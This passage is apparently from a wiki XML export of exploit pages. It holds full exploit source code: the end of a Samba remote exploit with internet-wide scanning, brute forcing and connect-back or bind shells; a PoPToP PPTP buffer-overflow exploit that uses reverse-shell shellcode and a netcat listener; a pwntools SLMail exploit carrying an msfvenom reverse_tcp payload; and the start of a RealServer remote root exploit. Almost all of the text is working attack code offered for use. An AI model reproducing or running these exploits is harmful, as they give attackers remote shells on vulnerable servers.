                                break;
                        case 'C':
                                MAX_CHILDS = atoi(optarg);
                                if (MAX_CHILDS == 0) {
                                        fprintf(stderr, "Invalid number of childs.\n");
                                        return -1;
                                }

                                if (MAX_CHILDS &gt; 99) {
                                        fprintf(stderr, "Too many childs, using 99. \n");
                                        MAX_CHILDS = 99;
                                }

                                break;
                        case 'd':
                                BRUTE_DELAY = atoi(optarg);
                                break;
                        case 'f':
                                force = 1;
                                break;
                        case 'p':
                                port = atoi(optarg);
                                if ((port &lt;= 0) || (port &gt; 65535)) {
                                        fprintf(stderr, "Invalid port.\n\n");
                                        return -1;
                                }
                                break;
                        case 'r':
                                ret = strtoul(optarg, &amp;optarg, 16);
                                break;
                        case 's':
                                random  = 1;
                                scan    = 1;
                                break;
                        case 'S':
                                random  = 0;
                                scan    = 1;
                                sscanf(optarg, "%d.%d.%d", &amp;ip1, &amp;ip2, &amp;ip3);
                                ip3--;
                                break;
                        case 't':
                                type = atoi(optarg);
                                if (type == 0 || type &gt; sizeof(targets) / 16) {
                                        for(i = 0; i &lt; sizeof(targets) / 16; i++)
                                                fprintf(stdout, "%02d. %s  [0x%08x]\n", i + 1, targets[i].type, (unsigned int) targets[i].ret);
                                        fprintf(stderr, "\n");
                                        return -1;
                                }
                                break;
                        case 'v':
                                verbose = 1;
                                break;
                        default:
                                usage(argv[0] == NULL ? "sambal" : argv[0]);
                                break;
                }

        }

        if ((argv[optind] == NULL &amp;&amp; scan == 0) || (type == 0 &amp;&amp; brute == -1 &amp;&amp; scan == 0)) 
                usage(argv[0] == NULL ? "sambal" : argv[0]);

        if (scan == 1) 
                fprintf(stdout, "+ Scan mode.\n");
        if (verbose == 1)
                fprintf(stdout, "+ Verbose mode.\n");

        if (scan == 1) {

                srand(getpid());

                while (1) {

                        if (random == 1) {
                                ip1 = rand() % 255;
                                ip2 = rand() % 255;
                                ip3 = rand() % 255; } 
                        else {
                                ip3++;
                                if (ip3 &gt; 254) { ip3 = 1; ip2++; }
                                if (ip2 &gt; 254) { ip2 = 1; ip1++; }
                                if (ip1 &gt; 254) exit(0);
                        }

                        for (ip4 = 0; ip4 &lt; 255; ip4++) {
                                i++;
                                snprintf(scan_ip, sizeof(scan_ip) - 1, "%u.%u.%u.%u", ip1, ip2, ip3, ip4);
                                usleep(BRUTE_DELAY);

                                switch (fork()) {
                                        case 0:
                                                switch(is_samba(scan_ip, 2)) {
                                                        case 0:
                                                                fprintf(stdout, "+ [%s] Samba\n", scan_ip);
                                                                break;
                                                        case 1:
                                                                fprintf(stdout, "+ [%s] Windows\n", scan_ip);
                                                                break;
                                                        default:
                                                                break;  
                                                }

                                                exit(0);
                                                break;
                                        case -1:
                                                fprintf(stderr, "+ fork() error\n");
                                                exit(-1);
                                                break;
                                        default:
                                                if (i &gt; MAX_CHILDS - 2) { 
                                                        wait(&amp;status); 
                                                        i--;
                                                }
                                                break;
                                }
                        }

                }

                return 0;
        }


        he = gethostbyname(argv[optind]);

        if (he == NULL) {
                fprintf(stderr, "Unable to resolve %s...\n", argv[optind]);
                return -1;
        }

        if (brute == -1) {

                if (ret == 0) ret = targets[type - 1].ret;

                shellcode = targets[type - 1].shellcode;

                if (connectback == 1) {
                        fprintf(stdout, "+ connecting back to: [%d.%d.%d.%d:45295]\n", 
                                        ip1, ip2, ip3, ip4);

                        switch(targets[type - 1].os_type) {
                                case 0: /* linux */
                                        shellcode = linux_connect_back;
                                        break;
                                case 1: /* FreeBSD/NetBSD */
                                        shellcode = bsd_connect_back;
                                        break;
                                case 2: /* OpenBSD */
                                        shellcode = bsd_connect_back;
                                        break;
                                case 3: /* OpenBSD 3.2 Non-exec stack */
                                        shellcode = bsd_connect_back;
                                        break;
                        }

                }

                if ((sock = socket(AF_INET, SOCK_STREAM, 6)) &lt; 0) {
                        fprintf(stderr, "+ socket() error.\n");
                        return -1;
                }

                if ((sock2 = socket(AF_INET, SOCK_STREAM, 6)) &lt; 0) {
                        fprintf(stderr, "+ socket() error.\n");
                        return -1;
                }

                memcpy(&amp;addr1.sin_addr, he-&gt;h_addr, he-&gt;h_length);
                memcpy(&amp;addr2.sin_addr, he-&gt;h_addr, he-&gt;h_length);

                addr1.sin_family = AF_INET;
                addr1.sin_port   = htons(port); 
                addr2.sin_family = AF_INET;
                addr2.sin_port   = htons(45295);

                if (connect(sock, (struct sockaddr *)&amp;addr1, sizeof(addr1)) == -1) { 
                        fprintf(stderr, "+ connect() error.\n");
                        return -1;
                }

                if (verbose == 1) fprintf(stdout, "+ %s\n", targets[type - 1].type);

                if (force == 0) {

                        if (is_samba(argv[optind], 2) != 0) {
                                fprintf(stderr, "+ Host is not running samba!\n\n");
                                return -1;
                        }

                        fprintf(stderr, "+ Host is running samba.\n");
                }

                if (verbose == 1) fprintf(stdout, "+ Connected to [%s:%d]\n", (char *)inet_ntoa(addr1.sin_addr), port);

                if (start_session(sock) &lt; 0) fprintf(stderr, "+ Session failed.\n");

                if (verbose == 1) fprintf(stdout, "+ Session enstablished\n");
                sleep(5);
                if (targets[type - 1].os_type != 2) {
                        if (exploit_normal(sock, ret, shellcode) &lt; 0) {
                                fprintf(stderr, "+ Failed.\n");
                                close(sock);
                        }
                } else {
                        if (exploit_openbsd32(sock, ret, shellcode) &lt; 0) {
                                fprintf(stderr, "+ Failed.\n");
                                close(sock);
                        }
                }

                sleep(2);

                if (connectback == 0) {
                        if(connect(sock2, (struct sockaddr *)&amp;addr2, sizeof(addr2)) == -1) {
                                fprintf(stderr, "+ Exploit failed, try -b to bruteforce.\n");

                                return -1;
                        }

                        fprintf(stdout, "--------------------------------------------------------------\n");

                        shell(sock2);
                        close(sock);
                        close(sock2);
                } else {
                        fprintf(stdout, "+ Done...\n");
                        close(sock2);
                        close(sock);
                }
                return 0;
        }

        signal(SIGPIPE, SIG_IGN);
        signal(SIGUSR1, handler);

        switch(brute) {
                case 0:
                        if (ret == 0) ret = 0xc0000000;
                        shellcode = linux_bindcode;
                        fprintf(stdout, "+ Bruteforce mode. (Linux)\n");
                        break;
                case 1:
                        if (ret == 0) ret = 0xbfc00000;
                        shellcode = bsd_bindcode;
                        fprintf(stdout, "+ Bruteforce mode. (FreeBSD / NetBSD)\n");
                        break;
                case 2:
                        if (ret == 0) ret = 0xdfc00000;
                        shellcode = bsd_bindcode;
                        fprintf(stdout, "+ Bruteforce mode. (OpenBSD 3.1 and prior)\n");
                        break;
                case 3:
                        if (ret == 0) ret = 0x00170000;
                        shellcode = bsd_bindcode;
                        fprintf(stdout, "+ Bruteforce mode. (OpenBSD 3.2 - non-exec stack)\n");
                        break;
                }

        memcpy(&amp;addr1.sin_addr, he-&gt;h_addr, he-&gt;h_length);
        memcpy(&amp;addr2.sin_addr, he-&gt;h_addr, he-&gt;h_length);

        addr1.sin_family = AF_INET;
        addr1.sin_port   = htons(port);
        addr2.sin_family = AF_INET;
        addr2.sin_port   = htons(45295);

        for (i = 0; i &lt; 100; i++)
                childs[i] = -1;
        i = 0;

        if (force == 0) {
                if (is_samba(argv[optind], 2) != 0) {
                        fprintf(stderr, "+ Host is not running samba!\n\n");
                        return -1;
                }

                fprintf(stderr, "+ Host is running samba.\n");
        }

        while (OWNED == 0) {

                if (sock  &gt; 2) close(sock);
                if (sock2 &gt; 2) close(sock2);

                if ((sock = socket(AF_INET, SOCK_STREAM, 6)) &lt; 0) {
                        if (verbose == 1) fprintf(stderr, "+ socket() error.\n");
                }
                else {  
                        ret -= STEPS;
                        i++;
                }

                if ((sock2 = socket(AF_INET, SOCK_STREAM, 6)) &lt; 0)
                        if (verbose == 1) fprintf(stderr, "+ socket() error.\n");


                if ((ret &amp; 0xff) == 0x00 &amp;&amp; brute != 3) ret++;

                if (verbose == 1) fprintf(stdout, "+ Using ret: [0x%08x]\n", (unsigned int)ret);

                usleep(BRUTE_DELAY);

                switch (childs[i] = fork()) {
                        case 0:
                                if(Connect(sock, (char *)inet_ntoa(addr1.sin_addr), port, 2) == -1) {
                                        if (sock  &gt; 2) close(sock);
                                        if (sock2 &gt; 2) close(sock2);
                                        exit(-1);
                                }

                                if(write_timer(sock, 3) == 1) {
                                        if (start_session(sock) &lt; 0) {
                                                if (verbose == 1) fprintf(stderr, "+ Session failed.\n");
                                                if (sock  &gt; 2)close(sock);
                                                if (sock2 &gt; 2) close(sock2);
                                                exit(-1);
                                        }

                                        if (brute == 3) {
                                                if (exploit_openbsd32(sock, ret, shellcode) &lt; 0) {
                                                        if (verbose == 1) fprintf(stderr, "+ Failed.\n");
                                                        if (sock  &gt; 2) close(sock);
                                                        if (sock2 &gt; 2) close(sock2);
                                                        exit(-1);
                                                }
                                        } 
                                else {
                                        if (exploit_normal(sock, ret, shellcode) &lt; 0) {
                                                if (verbose == 1) fprintf(stderr, "+ Failed.\n");
                                                if (sock  &gt; 2) close(sock);
                                                if (sock2 &gt; 2) close(sock2);
                                                exit(-1);
                                        }

                                        if (sock &gt; 2) close(sock);

                                        if ((sock2 = socket(AF_INET, SOCK_STREAM, 6)) &lt; 0) {
                                                if (sock2 &gt; 2) close(sock2);
                                                exit(-1);
                                        }

                                        if(Connect(sock2, (char *)inet_ntoa(addr1.sin_addr), 45295, 2) != -1) {
                                                if (sock2  &gt; 2) close(sock2);
                                                kill(getppid(), SIGUSR1);
                                        }

                                        exit(1);
                                }


                                exit(0);
                                break;
                        case -1:
                                fprintf(stderr, "+ fork() error\n");
                                exit(-1);
                                break;
                        default:
                                if (i &gt; MAX_CHILDS - 2) {
                                        wait(&amp;status);
                                        i--;
                                }
                                break;
                        }

                }

        }

        return 0;
}

// milw0rm.com [2003-04-10]
            
&lt;/pre&gt;</text>
      <sha1>p3v42zyylgznqsc72satlcbet068ayt</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2003-0213 PoPToP PPTP 1.1.4-b3 - 'poptop-sane.c' 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1663</id>
    <revision>
      <id>2067</id>
      <timestamp>2021-05-03T12:34:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /*  * Fixed Exploit against PoPToP in Linux (poptop-sane.c)  * ./r4nc0rwh0r3 of blightninjas (blightninjas@hushmail.com)  *  * blightninjas: bringing pain, suffe..."</comment>
      <origin>2067</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="10289" sha1="n6x5qoxw7rtqg0iwao38iek7btx1v7h" xml:space="preserve">==EXP==
&lt;pre&gt;
/*
 * Fixed Exploit against PoPToP in Linux (poptop-sane.c)
 * ./r4nc0rwh0r3 of blightninjas (blightninjas@hushmail.com)
 *
 * blightninjas: bringing pain, suffering, and humiliation to the security world
 * Expect more great release like helloworld-annotated.c and
 * cd explained whitepaper, we are working hard in da underground
 *
 * Other Editions Available At:
 *   http://www.freewebs.com/blightninjas/
 *
 *  *** Bugtraq Clean Edition ***
 * Based off of code by einstein_dhtm@front.ru
 * 
 * Notes on the exploit:
 * This was only tested under slackware, RET_OFF could possibly
 * be different.
 * You can have nulls in the shellcode (the hole is in a read())
 * This allows you to have ips and ports with nulls in them
 * 
 * Shouts to ADM, TESO, and all the other "cool" groups that never give us 0day
 *
 * Examples:
 * attack target 1
 * nc -v -l -p 10000 &lt;-- on 1.1.1.2
 * ./poptop-sane 1.1.1.1 1.1.1.2 10000 -t 1
 * don't come to use, we come to you.
 *
 * ./poptop-sane 1.1.1.1 1.1.1.2 10000 -t
 * list targets
 *
 * ./poptop-sane 1.1.1.1 1.1.1.2 10000 -r 0xbffff600
 * attack using ret address 0xbffff600
 *
 * I think you get the point
 */

#include &lt;stdio.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;signal.h&gt;

#define NOP_LENGTH 140
// I calculate at 336, I'll fudge to make more general
#define RET_OFF 320
#define MAX_HOSTNAME_SIZE               64
#define MAX_VENDOR_SIZE                 64
#define PPTP_VERSION                    0x0100
/* Magic Cookie */
#define PPTP_MAGIC_COOKIE               0x1a2b3c4d

/* Message types */
#define PPTP_CTRL_MESSAGE               1

/* Control Connection Management */
#define START_CTRL_CONN_RQST            1
#define START_CTRL_CONN_RPLY            2
#define STOP_CTRL_CONN_RQST             3
#define STOP_CTRL_CONN_RPLY             4
#define ECHO_RQST                       5
#define ECHO_RPLY                       6

// brute force values
// Values can be increased both ways
#define TOPOFSTACK 0xbffff800
#define BOTTOMOFSTACK 0xbffff000
#define STEP 64

/* esdee I love you, call me sometime */
char
shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
  "\x06\x51\xb1\x01\x51\xb1\x02\x51"
  "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
  "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
  "\x68\x41\x42\x43\x44\x66\x68\xb0"
  "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
  "\x10\x53\x57\x52\x89\xe1\xb3\x03"
  "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
  "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
  "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
  "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
  "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
  "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
  "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
  "\x2f\x62\x69\x89\xe3\x50\x53\x89"
  "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
  "\x01\xcd\x80";

int st;
struct target {
  char *desc;
  u_int32_t ret;
} targets[] =
{
  {"Slackware 8.0 Linux 2.4.18 pptpd-1.0.1", 0xbffff540},
  {"Slackware 8.0 Linux 2.4.18 pptpd-1.1.3", 0xbffff580},
};
  
struct pptp_header {
  u_int16_t length;               /* pptp message length incl header */
  u_int16_t pptp_type;            /* pptp message type */
  u_int32_t magic;                /* magic cookie */
  u_int16_t ctrl_type;            /* control message type */
  u_int16_t reserved0;            /* reserved */
};

struct pptp_start_ctrl_conn_rqst {
  struct pptp_header header;      /* pptp header */
  u_int16_t version;              /* pptp protocol version */
  u_int16_t reserved1;            /* reserved */
  u_int32_t framing_cap;          /* framing capabilities */
  u_int32_t bearer_cap;           /* bearer capabilities */
  u_int16_t max_channels;         /* maximum channels */
  u_int16_t firmware_rev;         /* firmware revision */
  u_int8_t hostname[MAX_HOSTNAME_SIZE];   /* hostname */
  u_int8_t vendor[MAX_VENDOR_SIZE];       /* vendor */
};

struct pptp_echo_rqst {
  struct pptp_header header;      /* header */
  u_int32_t identifier;           /* value to match rply with rqst */
  char buf[10000];
};

struct pptp_reply {
  struct pptp_header header;      /* header */
  char buf[10000];
};

void catch_pipe() {
  printf("Broken pipe caught, server most likely patched.\n");
  exit(1);
}
void send_init_request(int st)
{
  struct pptp_start_ctrl_conn_rqst request;
  request.header.magic = htonl(PPTP_MAGIC_COOKIE);
  request.header.pptp_type = htons(PPTP_CTRL_MESSAGE);
  request.header.ctrl_type = htons(START_CTRL_CONN_RQST);
  
  request.version = PPTP_VERSION;
  request.framing_cap = 0;
  request.bearer_cap = 0;
  request.max_channels = 1;
  request.firmware_rev = 0;
  strcpy(request.hostname,"hell");
  strcpy(request.vendor,"domain HELL");
  request.header.length = ntohs(sizeof(request));
  
  send(st,(char*)&amp;request,sizeof(request),0);
}

void send_ping_overflow(int st, u_int32_t ret, char *hostname, short port)
{ 
  struct pptp_echo_rqst ping;
  int i, buflen = 500;

  ping.header.magic = htonl(PPTP_MAGIC_COOKIE);
  ping.header.pptp_type = htons(PPTP_CTRL_MESSAGE);
  ping.header.ctrl_type = htons(ECHO_RQST);
  ping.identifier = 111;  
  ping.header.length = ntohs(1);

  for (i = 0; i &lt; NOP_LENGTH; i++) ping.buf[i] = '\x90';      

  *(unsigned long int*)(shellcode+33) = inet_addr(hostname);
  *(unsigned short int*)(shellcode+39) = htons(port);

  memcpy(ping.buf+NOP_LENGTH,shellcode,sizeof(shellcode));
  for(i = RET_OFF; i &lt; buflen - 4; i+=4)
    memcpy(ping.buf+i,(char*)&amp;ret,4); 

  send(st,(char*)&amp;ping,sizeof(ping.header)+buflen,0); 
}

int connect_server(char* hostname)
{
  struct sockaddr_in addr;
  st=socket(PF_INET,SOCK_STREAM,0);
  if ((st=socket(PF_INET,SOCK_STREAM,0)) == -1) return 0;

  addr.sin_family=AF_INET;
  addr.sin_port=0;
  addr.sin_addr.s_addr=0;
  bind(st, (struct sockaddr *)&amp;addr,sizeof(struct sockaddr));
  
  addr.sin_family=AF_INET;
  addr.sin_port=htons(1723);
  addr.sin_addr.s_addr=inet_addr(hostname);
  printf("connecting... ");
  if ((connect(st,(struct sockaddr*)&amp;addr,sizeof(addr))) != 0)
  {
    perror("connect");
    return 0;
  }
  return 1;
}

int main(int argc, char** argv)
{
  struct pptp_reply reply;
  // rushing things only makes it worse
  int timeout = 1000;
  u_int32_t ret;
  int bytes, j, checked = 0;
  signal(SIGPIPE, catch_pipe);
  printf("\n");
  // Sorry, I failed REALLY FUCKING LAME ASCII ART class
  printf("        D     A     SSSSS                           \n");
  printf("        D    A A    S     SSSSS     T\n");
  printf("        D   A   A   S     S         T     EE    AA   M   M \n");
  printf("    DDD D  AAAAAAA  SSSSS S         T    E  E  A  A  MM MM \n");
  printf("   D   DD  A     A      S SSSSS    TTTT  E  E  A  A  MM MM \n");
  printf("  D     D  A     A      S     S     T    EEE   AAAA  M M M \n");
  printf("   D    D  A     A  SSSSS     S     T    E     A  A  M   M \n");
  printf("    DDDD   A     A        SSSSS      TTT  EEE  A  A  M   M   ");
  printf(" ... presents ... \n\n");                
  printf("Exploit for PoPToP PPTP server older than\n1.1.4-b3 and 1.1.3-20030409 under Linux.\n");
  printf("by .einstein., April 2003.  &lt;-- the genius\n\n");
  printf("fixed by ./r4nc0rwh0r3 of blightninjas  blightninjas@hushmail.com\n\n");
  if (argc &lt; 2)
  {
    printf("usage: \n");
    printf("  %s &lt;pptp_server&gt; [your_ip] [your_port] ...\n",argv[0]);
    printf("   -b [timeout in ms]\n");
    printf("   -t [target]\n");
    printf("   -r [ret address]\n");
    //Abridged edition 
    printf(" Only supply pptp_server to test exploitability using really poor method.\n");
    printf(" Connect back to your_ip at your_port.\n\n");
    return 0;
  }

  if (argc == 2)
  {
    if (!connect_server(argv[1])) return 1;
  
    printf("\nChecking if the server is vulnerable..\n");
    printf("(if it is you have to wait 65 seconds)..\n");
    send_init_request(st);
  
    ret = 0x01010101;
  
    //header length
    bytes = recv(st,(char*)&amp;reply,2,0);
    bytes = ntohs(reply.header.length);
    bytes = recv(st,(char*)&amp;reply+2,bytes-2,0);
    j = htons(reply.header.ctrl_type);
    send_ping_overflow(st,ret,"0.0.0.0",0);
  
    //header length
    bytes = recv(st,(char*)&amp;reply,2,0);
    printf("PoPToP server is ");
    if ((bytes = recv(st,(char*)&amp;reply,2,0)) != -1) printf("vulnerable!\n");
    else printf("not vulnerable\n");
    close(st);
  
    return 1;
  }
  if(argc &lt; 5) exit(1);
  else if(strncmp(argv[4], "-b", 2) == 0) {
    if(argc == 6) timeout = atoi(argv[5]);
    printf("[!] Attempting bruteforce against %s, timeout: %d\n", argv[1], timeout);
    printf("interrupt when you get a shell to %s on port %d...\n\n",argv[2],atoi(argv[3]));

    for (ret = TOPOFSTACK; ret &gt;=BOTTOMOFSTACK; ret -= STEP) {
      printf("[*] ");
      if (!connect_server(argv[1])) return 1;
      printf("[ret=0x%x]..",ret);
      printf("sending payload..");

      // initial packet
      send_init_request(st);

      //a real overflowing ping packet
      send_ping_overflow(st,ret,argv[2],atoi(argv[3]));
      close(st);

      usleep(timeout * 1000);
      printf("done\n");
    }
  }
  else if(strncmp(argv[4], "-t", 2) == 0) {
    if(argc == 6 &amp;&amp; atoi(argv[5]) &gt;= 0
     &amp;&amp; atoi(argv[5]) &lt; sizeof(targets)/sizeof(struct target)) {
      ret = targets[atoi(argv[5])].ret;
      printf("[!] Attacking %s using %s\n", argv[1], targets[atoi(argv[5])].desc);

      printf("[*] ");
      if (!connect_server(argv[1])) return 1;
      printf("[ret=0x%x]..",ret);
      printf("sending payload..");

      // initial packet
      send_init_request(st);

      //a real overflowing ping packet
      send_ping_overflow(st,ret,argv[2],atoi(argv[3]));
      close(st);

      printf("done\n");
    }
    else {
      for(j = 0; j &lt; sizeof(targets)/sizeof(struct target); j++) {
        printf("%02d - %s\n", j, targets[j].desc);
      }
      printf("\n");
    }
  }
  else if(strncmp(argv[4], "-r", 2) == 0) {
    if(argc == 6) {
      sscanf(argv[5], "%x", (unsigned int *)&amp;ret);
      printf("[!] Attacking %s\n", argv[1]);

      printf("[*] ");
      if (!connect_server(argv[1])) return 1;
      printf("[ret=0x%x]..",ret);
      printf("sending payload..");

      // initial packet
      send_init_request(st);

      //a real overflowing ping packet
      send_ping_overflow(st,ret,argv[2],atoi(argv[3]));
      close(st);

      printf("done\n");
    }
  }
  return 0;
}

// milw0rm.com [2003-04-25]
            
&lt;/pre&gt;</text>
      <sha1>n6x5qoxw7rtqg0iwao38iek7btx1v7h</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2003-0264 SLMail 5.1.0.4420緩衝區漏洞</title>
    <ns>0</ns>
    <id>592</id>
    <revision>
      <id>806</id>
      <timestamp>2021-03-31T07:25:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/env python # # CVE-2003-0264 exploit based on: # * pwntools # * metasploit reverse_tcp payload # * SLmail 5.5 from https://www.exploit-db.com/apps/12f..."</comment>
      <origin>806</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3527" sha1="dgckmnt3nyrcpw8pinfem9bz78gzgtb" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/env python
#
# CVE-2003-0264 exploit based on:
# * pwntools
# * metasploit reverse_tcp payload
# * SLmail 5.5 from https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe

from pwn import *
from threading import Thread


def generate_payload():
    # msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.15.101 LPORT=4444 -f python -v shellcode -a x86 --platform windows -b "\x00\x0d\x0a"
    shellcode = ""
    shellcode += "\xda\xcb\xba\xaf\xe1\x98\xd7\xd9\x74\x24\xf4\x5e"
    shellcode += "\x31\xc9\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\xf9"
    shellcode += "\xf2\x7a\x22\xf9\x1d\xf8\xcd\x01\xde\x9d\x44\xe4"
    shellcode += "\xef\x9d\x33\x6d\x5f\x2e\x37\x23\x6c\xc5\x15\xd7"
    shellcode += "\xe7\xab\xb1\xd8\x40\x01\xe4\xd7\x51\x3a\xd4\x76"
    shellcode += "\xd2\x41\x09\x58\xeb\x89\x5c\x99\x2c\xf7\xad\xcb"
    shellcode += "\xe5\x73\x03\xfb\x82\xce\x98\x70\xd8\xdf\x98\x65"
    shellcode += "\xa9\xde\x89\x38\xa1\xb8\x09\xbb\x66\xb1\x03\xa3"
    shellcode += "\x6b\xfc\xda\x58\x5f\x8a\xdc\x88\x91\x73\x72\xf5"
    shellcode += "\x1d\x86\x8a\x32\x99\x79\xf9\x4a\xd9\x04\xfa\x89"
    shellcode += "\xa3\xd2\x8f\x09\x03\x90\x28\xf5\xb5\x75\xae\x7e"
    shellcode += "\xb9\x32\xa4\xd8\xde\xc5\x69\x53\xda\x4e\x8c\xb3"
    shellcode += "\x6a\x14\xab\x17\x36\xce\xd2\x0e\x92\xa1\xeb\x50"
    shellcode += "\x7d\x1d\x4e\x1b\x90\x4a\xe3\x46\xfd\xbf\xce\x78"
    shellcode += "\xfd\xd7\x59\x0b\xcf\x78\xf2\x83\x63\xf0\xdc\x54"
    shellcode += "\x83\x2b\x98\xca\x7a\xd4\xd9\xc3\xb8\x80\x89\x7b"
    shellcode += "\x68\xa9\x41\x7b\x95\x7c\xc5\x2b\x39\x2f\xa6\x9b"
    shellcode += "\xf9\x9f\x4e\xf1\xf5\xc0\x6f\xfa\xdf\x68\x05\x01"
    shellcode += "\x88\x56\x72\x06\x2d\x3f\x81\x18\xbc\xe3\x0c\xfe"
    shellcode += "\xd4\x0b\x59\xa9\x40\xb5\xc0\x21\xf0\x3a\xdf\x4c"
    shellcode += "\x32\xb0\xec\xb1\xfd\x31\x98\xa1\x6a\xb2\xd7\x9b"
    shellcode += "\x3d\xcd\xcd\xb3\xa2\x5c\x8a\x43\xac\x7c\x05\x14"
    shellcode += "\xf9\xb3\x5c\xf0\x17\xed\xf6\xe6\xe5\x6b\x30\xa2"
    shellcode += "\x31\x48\xbf\x2b\xb7\xf4\x9b\x3b\x01\xf4\xa7\x6f"
    shellcode += "\xdd\xa3\x71\xd9\x9b\x1d\x30\xb3\x75\xf1\x9a\x53"
    shellcode += "\x03\x39\x1d\x25\x0c\x14\xeb\xc9\xbd\xc1\xaa\xf6"
    shellcode += "\x72\x86\x3a\x8f\x6e\x36\xc4\x5a\x2b\x56\x27\x4e"
    shellcode += "\x46\xff\xfe\x1b\xeb\x62\x01\xf6\x28\x9b\x82\xf2"
    shellcode += "\xd0\x58\x9a\x77\xd4\x25\x1c\x64\xa4\x36\xc9\x8a"
    shellcode += "\x1b\x36\xd8"

    # EIP will point to known 'JMP ESP' from non ASLR-enabled module
    EIP = p32(0x5F4A358F)
    EBP = 'BBBB'

    NOP = '\x90'
    buf = NOP * BYTES_TO_FILL

    NOP_slide = NOP * 100

    return buf + EBP + EIP + NOP_slide + shellcode


def attack():
    r = remote(RHOST, RPORT)

    server_helo = r.recvline()
    if server_helo.startswith('+OK '):
        log.info('Received server hello')
    else:
        log.error('Unknown string received: ' + server_helo)

    r.send('USER whatever\n')
    r.recvline()

    payload = generate_payload()

    r.send('PASS {}\n'.format(payload))
    r.shutdown()


if __name__ == "__main__":
    # set target info
    RHOST = '192.168.15.100'
    RPORT = 110
    LPORT = 4444

    # determined with the help of x64dbg
    BYTES_TO_FILL = 80426

    # set context to target arch
    context.update(arch='i386', os='windows')

    thread = Thread(target=attack)
    thread.start()

    listener = listen(port=LPORT)
    listener.wait_for_connection()
    listener.interactive()

    thread.join()

&lt;/pre&gt;</text>
      <sha1>dgckmnt3nyrcpw8pinfem9bz78gzgtb</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2003-0725 Real Server 7/8/9 (Windows / Linux) 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1665</id>
    <revision>
      <id>2069</id>
      <timestamp>2021-05-03T12:36:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /*************************************************************** /* THCREALbad 0.4 - Wind0wZ &amp; Linux remote root exploit  /* Exploit by: Johnny Cyberpunk thehack..."</comment>
      <origin>2069</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7446" sha1="r01oyoipplqkl1za5z2xd7laxo4nid6" xml:space="preserve">==EXP==
&lt;pre&gt;
/***************************************************************
/* THCREALbad 0.4 - Wind0wZ &amp; Linux remote root exploit 
/* Exploit by: Johnny Cyberpunk thehackerschoice
/* THC PUBLIC SOURCE MATERIALS 
/*
/* http://www.service.real.com/help/faq/security/rootexploit082203.html
/* 
/* After successful exploitation of a Linux box just type in the following 
/* ps -ef | grep -i rmserver 
/* and then search for the first appearing master pid of rmserver and type 
/* kill -9 &lt;master pid of rmserver&gt; 
/* Otherwise the master process detects that the compromised thread isn't 
/* running in a stable state any longer and kicks u of the box. 
/* On Windows Realservers it doesn't matter, the connection keeps up. 
/* 
/* Also try the testing mode before exploitation of this bug, what OS is 
/* running on the remote site, to know what type of shellcode to use. 
/* 
/* Greetings go to Dave Aitel of Immunitysec who found that bug. 
/* 
/* compile with MS Visual C++ : cl THCREALbad.c 
/***************************************************************

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;winsock2.h&gt;

#define WINDOWS 0
#define LINUX 1
#define OSTESTMODE 2

#pragma comment(lib, "ws2_32.lib")

char ostestmode[] = "OPTIONS / RTSP/1.0\r\n\r\n";

char attackbuffer1[] =
"DESCRIBE /"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../"
"../../../../../../../../../../../../../../../../../../../../";

char attackbuffer2[] =
".smi RTSP/1.0\r\n\r\n";

char decoder[] =
"\xcc\xcc\x90\x8b\xfd\x83\xc7\x37\x33\xc9\xb2\x90\x66\x81\xc1"
"\x38\x01\x8a\x1f\x32\xda\x88\x1f\x47\xe2\xf7";

